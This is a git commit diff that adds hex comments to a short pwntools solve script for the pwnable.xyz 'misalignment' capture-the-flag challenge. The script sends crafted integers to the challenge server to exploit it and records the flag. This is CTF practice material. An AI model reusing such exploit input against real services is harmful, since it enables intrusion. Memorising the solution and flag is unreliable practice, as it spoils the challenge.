fef782f98c735e5572ff876ab220647e6ceb053f
Dillon Wu <dillonw@andrew.cmu.edu>
2023-07-01 19:00:44 -0400

    minor comments

--- pwnable-xyz/misalignment/solve.py
+++ pwnable-xyz/misalignment/solve.py
@@ -2,8 +2,10 @@ from pwn import *
 
 def solve():
     r = remote('svc.pwnable.xyz', 30003)
+    # 0xb0000000
     r.sendline("92274688 92274688 -5")
     print(r.recvline())
+    # 0xb500000000000000
     r.sendline("6521212260432478208 6521212260432478208 -6")
     r.interactive()
     # Flag: FLAG{u_cheater_used_a_debugger}
